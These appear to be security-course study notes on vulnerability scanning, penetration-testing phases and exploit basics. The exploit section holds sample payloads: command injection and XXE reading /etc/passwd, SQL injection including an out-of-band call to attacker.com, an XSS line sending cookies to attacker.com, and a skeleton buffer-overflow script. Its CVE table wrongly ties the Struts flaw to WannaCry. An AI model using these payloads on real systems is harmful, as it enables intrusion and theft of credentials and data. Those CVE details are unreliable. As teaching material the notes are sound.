# Week 2 — Theoretical Knowledge Notes

> These notes cover the core concepts required for Week 2 VAPT activities.
> Topics: Vulnerability Scanning, Penetration Testing Phases, Exploit Development Basics.

---

## 1. Vulnerability Scanning Techniques

### 1.1 What is Vulnerability Scanning?

Vulnerability scanning is the **automated process of identifying security weaknesses** in systems, networks, and applications. Unlike penetration testing, scanning is generally non-exploitative and focuses on **discovery and classification** of weaknesses.

---

### 1.2 Scan Types

| Scan Type | Description | Tools |
|-----------|-------------|-------|
| **Network Scanning** | Discovers open ports, services, and OS on hosts | Nmap, Masscan |
| **Application Scanning** | Identifies web-layer flaws (SQLi, XSS, misconfigs) | Nikto, Burp Suite |
| **Authenticated Scan** | Scanner logs into target with credentials — deeper coverage | OpenVAS (with credentials) |
| **Unauthenticated Scan** | No credentials — simulates external attacker view | Nmap, Nessus (default) |
| **Credentialed Scan** | More complete; finds patch-level and config issues | Nessus, OpenVAS |

**Key Difference — Authenticated vs. Unauthenticated:**
- **Unauthenticated:** Reflects what an external attacker would see. May miss internal vulnerabilities.
- **Authenticated:** Logs in as a legitimate user. Reveals full patch status, software inventory, misconfigurations.

---

### 1.3 Vulnerability Scoring — CVSS v4.0

**CVSS (Common Vulnerability Scoring System)** provides a standardised way to rate severity.

| Score Range | Severity | Action |
|-------------|----------|--------|
| 0.0 | None | No action needed |
| 0.1 – 3.9 | Low | Schedule fix |
| 4.0 – 6.9 | Medium | Remediate within 30 days |
| 7.0 – 8.9 | High | Remediate within 7 days |
| 9.0 – 10.0 | Critical | Immediate patch/mitigation |

**CVSS v4.0 Metric Groups:**
1. **Base Metrics** — Intrinsic qualities of the vulnerability (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Impact)
2. **Threat Metrics** — Current exploit code maturity
3. **Environmental Metrics** — Organisation-specific context
4. **Supplemental Metrics** — Optional additional context

**Real-World Example:**

| CVE | Vulnerability | CVSS v3 Score | Severity |
|-----|---------------|---------------|----------|
| CVE-2017-5638 | Apache Struts RCE (WannaCry-related vector) | 10.0 | Critical |
| CVE-2021-41773 | Apache Path Traversal RCE | 9.8 | Critical |
| CVE-2019-0708 | BlueKeep (RDP RCE) | 9.8 | Critical |
| CVE-2021-44228 | Log4Shell | 10.0 | Critical |

---

### 1.4 False Positives and Validation

A **false positive** is a scanner report of a vulnerability that does **not actually exist** in the target.

**Causes:**
- Banner grabbing misidentification (service says it is Apache 2.2 but is patched)
- Version mismatch (scanner matches version string, ignores backport patches)
- Network filtering (port appears open due to firewall behaviour)

**Validation Steps:**
1. Cross-reference CVSS with CVE details at [nvd.nist.gov](https://nvd.nist.gov)
2. Manual verification: Check if the vulnerable code path is reachable
3. Exploit-DB PoC testing in lab environment
4. Use multiple scanners and compare results

---

### 1.5 References

- [OWASP Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115: Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [NVD — National Vulnerability Database](https://nvd.nist.gov)

---

## 2. Penetration Testing Techniques

### 2.1 What is Penetration Testing?

Penetration testing is a **controlled, authorised simulation of an attack** against a system to identify exploitable vulnerabilities before malicious actors do. It goes beyond scanning by **actively attempting exploitation**.

---

### 2.2 Phases of Penetration Testing (PTES)

The **Penetration Testing Execution Standard (PTES)** defines seven phases:

```
┌─────────────────────────────────────────────────────────┐
│  1. Pre-Engagement → 2. Recon → 3. Threat Modelling     │
│  → 4. Vuln Analysis → 5. Exploitation → 6. Post-Exploit  │
│  → 7. Reporting                                          │
└─────────────────────────────────────────────────────────┘
```

| Phase | Description | Tools |
|-------|-------------|-------|
| **1. Pre-Engagement** | Define scope, rules of engagement, legal agreement | Contracts, SOW |
| **2. Reconnaissance** | Passive/Active info gathering about target | Maltego, Shodan, OSINT |
| **3. Threat Modelling** | Identify assets and attack surfaces | Threat models, STRIDE |
| **4. Vulnerability Analysis** | Discover vulnerabilities in target | Nmap, OpenVAS, Nessus |
| **5. Exploitation** | Attempt to exploit identified vulnerabilities | Metasploit, Burp Suite |
| **6. Post-Exploitation** | Maintain access, escalate privileges, pivot | Meterpreter, Volatility |
| **7. Reporting** | Document findings, evidence, remediation advice | Google Docs, templates |

---

### 2.3 Reconnaissance Deep Dive

**Passive Reconnaissance** — No direct contact with target:
- WHOIS lookups
- Google Dorking: `site:example.com filetype:pdf`
- Shodan: `org:"Target Company" port:22`
- LinkedIn enumeration

**Active Reconnaissance** — Direct contact with target (noisier):
- DNS enumeration: `dnsenum`, `fierce`
- Subdomain brute-forcing: `Sublist3r`, `amass`
- Port scanning: `nmap`

**OSINT Framework:** [osintframework.com](https://osintframework.com) — comprehensive collection of OSINT tools.

---

### 2.4 OWASP Web Security Testing Guide (WSTG)

The OWASP WSTG covers testing for:

| Category | Key Tests |
|----------|-----------|
| **Information Gathering** | Fingerprint web server, enumerate content |
| **Configuration Testing** | Test network/app configuration, HTTP methods |
| **Identity Management** | Account enumeration, policy weaknesses |
| **Authentication Testing** | Default credentials, brute-force, MFA bypass |
| **Authorisation Testing** | Directory traversal, privilege escalation |
| **Session Management** | Cookie attributes, CSRF, session fixation |
| **Input Validation** | XSS, SQLi, XML injection, command injection |
| **Error Handling** | Improper error codes revealing stack traces |
| **Cryptography** | Weak TLS, sensitive data exposure |
| **Business Logic** | Bypassing workflows, price manipulation |

---

### 2.5 Ethics and Legal Considerations

> ⚠️ **Penetration testing without written authorisation is illegal** under the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and equivalent laws worldwide.

**Mandatory Pre-conditions:**
- Signed Statement of Work (SOW) or Rules of Engagement (RoE)
- Defined scope (IP ranges, domains, excluded systems)
- Emergency contact list
- Get-out-of-jail letter (written authorisation to test)

**Scope Creep Prevention:**
- Never test systems outside the agreed scope
- Stop immediately if PII, financial data, or live production systems are encountered unexpectedly
- Document all actions with timestamps

---

### 2.6 References

- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/)
- [SANS Pentest Resources](https://www.sans.org/blog/pen-test-poster/)
- [TryHackMe — Pentest paths](https://tryhackme.com)

---

## 3. Exploit Development Basics

### 3.1 What is Exploit Development?

Exploit development is the process of writing **proof-of-concept (PoC) code** that leverages a vulnerability to achieve unintended behaviour in a system, such as arbitrary code execution, privilege escalation, or data exfiltration.

---

### 3.2 Common Exploit Types

| Exploit Type | Description | Example |
|--------------|-------------|---------|
| **Buffer Overflow** | Overwrites memory beyond allocated buffer — hijacks EIP/RIP | Classic stack smashing |
| **SQL Injection** | Injects SQL statements via unvalidated input | `' OR '1'='1' --` |
| **Cross-Site Scripting (XSS)** | Injects client-side scripts into web pages | `<script>alert(1)</script>` |
| **Command Injection** | Executes OS commands via unvalidated input | `; cat /etc/passwd` |
| **Format String** | Exploits improper handling of printf-style format specifiers | `%x %x %x %n` |
| **Use-After-Free** | Exploits dangling pointers after memory is freed | Browser heap exploits |
| **XXE (XML External Entity)** | Abuses XML parsers to read files or SSRF | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |

---

### 3.3 Buffer Overflow — Conceptual Walkthrough

A stack-based buffer overflow occurs when a programme writes more data into a buffer than it can hold, overwriting adjacent memory.

**Memory Layout (simplified):**
```
[ Buffer (64 bytes) ][ Saved EBP ][ Return Address (EIP) ][ ... ]
```

**Attack Steps:**
1. Find vulnerable input (e.g., gets(), strcpy() calls)
2. Determine offset to EIP using a cyclic pattern (e.g., `msf-pattern_create -l 200`)
3. Control EIP — point it to malicious shellcode
4. Bypass protections (ASLR, DEP/NX, Stack Canaries) if present

**Simple Python PoC (educational):**
```python
#!/usr/bin/env python3
# Buffer Overflow PoC — Educational Use Only
import socket

target_ip = "192.168.1.100"
target_port = 1234
offset = 76  # bytes to reach EIP
eip = b"\x42\x42\x42\x42"  # "BBBB" — placeholder for return address

payload = b"A" * offset + eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload)
s.close()
print("[*] Payload sent")
```

---

### 3.4 SQL Injection — Types and Examples

| Type | Description | Example Payload |
|------|-------------|-----------------|
| **Classic (Error-based)** | Extracts data via error messages | `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--` |
| **UNION-based** | Uses UNION to append query results | `' UNION SELECT username,password FROM users--` |
| **Blind Boolean-based** | Infers data via True/False responses | `' AND 1=1--` vs `' AND 1=2--` |
| **Blind Time-based** | Uses time delays to infer data | `'; IF (1=1) WAITFOR DELAY '0:0:5'--` |
| **Out-of-band** | Exfiltrates via DNS/HTTP | `'; EXEC xp_dirtree '//attacker.com/test'--` |

---

### 3.5 XSS — Types and Examples

| Type | Description | Example |
|------|-------------|---------|
| **Reflected XSS** | Script in URL reflected back | `https://site.com/search?q=<script>alert(1)</script>` |
| **Stored (Persistent) XSS** | Script saved in database, shown to all users | Comment field: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` |
| **DOM-based XSS** | Vulnerability in client-side JS | `document.write(location.hash.substring(1))` |

---

### 3.6 Security Mitigations

| Mitigation | Description | Bypasses |
|------------|-------------|---------|
| **ASLR** | Randomises memory addresses | Info leaks, heap spraying |
| **DEP/NX** | Prevents execution of stack/heap | ROP (Return-Oriented Programming) |
| **Stack Canary** | Detects stack smashing | Format strings, heap overflows |
| **WAF** | Blocks malicious HTTP patterns | Encoding, obfuscation, whitespace |
| **Prepared Statements** | Parameterised SQL — prevents SQLi | N/A (proper fix) |
| **CSP** | Content Security Policy — limits XSS | Misconfigured policies |

---

### 3.7 References

- [Exploit-DB](https://www.exploit-db.com)
- [TCM Security — Buffer Overflow Guide](https://tcm-sec.com)
- [TryHackMe — Buffer Overflow Room](https://tryhackme.com/room/bufferoverflowprep)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

